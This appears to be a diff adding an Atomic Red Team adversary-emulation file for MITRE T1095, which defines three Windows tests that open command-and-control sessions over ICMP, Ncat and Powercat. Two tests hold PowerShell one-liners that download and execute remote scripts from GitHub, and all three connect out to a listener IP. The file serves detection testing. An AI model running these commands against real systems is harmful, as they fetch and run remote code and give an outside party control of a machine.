@@ -1,0 +1,75 @@
+---
+attack_technique: T1095
+display_name: Standard Non-Application Layer Protocol
+
+atomic_tests:
+- name: ICMP C2
+  description: |
+    This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
+    refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
+  supported_platforms:
+    - windows
+  input_arguments:
+    server_ip: 
+      description: The IP address of the listening server
+      type: ip
+      default: 127.0.0.1 
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
+      Invoke-PowerShellIcmp -IPAddress #{server_ip}
+
+- name: Netcat C2
+  description: |
+    Start C2 Session Using Ncat
+    To start the listener on a Linux device, type the following: 
+    nc -l -p <port>
+  supported_platforms:
+    - windows
+  dependency_executor_name: command_prompt
+  dependencies:
+    - description: |
+        Nmap must be installed
+      prereq_command: |
+        ncat -h 2> nul
+      get_prereq_command: |
+        echo "Install nmap so that ncat.exe will be available for use"
+  input_arguments:
+    server_ip: 
+      description: The IP address or domain name of the listening server
+      type: ip
+      default: 127.0.0.1
+    server_port:
+      description: The port for the C2 connection
+      type: port number
+      default: 80
+  executor:
+    name: command_prompt
+    elevation_required: false
+    command: |
+      ncat #{server_ip} #{server_port}
+
+- name: Powercat C2
+  description: |
+    Start C2 Session Using Powercat
+    To start the listener on a Linux device, type the following: 
+    nc -l -p <port>
+  supported_platforms:
+    - windows
+  input_arguments:
+    server_ip: 
+      description: The IP address or domain name of the listening server
+      type: ip
+      default: 127.0.0.1
+    server_port:
+      description: The port for the C2 connection
+      type: port number
+      default: 80
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
+      powercat -c #{server_ip} -p #{server_port}
